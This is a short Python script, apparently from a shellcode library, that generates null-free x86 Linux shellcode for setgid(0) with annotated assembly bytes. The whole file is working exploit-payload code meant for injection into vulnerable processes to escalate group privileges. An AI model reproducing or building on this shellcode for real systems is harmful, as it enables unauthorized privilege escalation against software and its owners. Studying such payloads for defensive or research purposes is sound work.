from struct import pack
import sys 
import binascii

##########################################################
#
#  1.  setgid shellcode
#  
#
#	                         random	     2014-04-21
##########################################################
des_format = 'shellcode: setgid(%s)' 
GID = 0
##########################################################

def setgid_shellcode(groupid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (groupid <= 0):
		pass
	elif (groupid <= 0xff):
		shellcode += '\xb3' + pack('B',groupid)							#mov bl,GID
	elif (groupid > 0xff):
		if not (groupid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',groupid+1)			#mov bx,(GID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',groupid)				#mov bx,(GID)
	shellcode += '\xb0\x2E'													#mov ax,0x2E
	shellcode += '\xcd\x80'													#int 0x80  -----> setgid(GID)
	return shellcode



if __name__ == '__main__':

	shellcode = setgid_shellcode(GID)

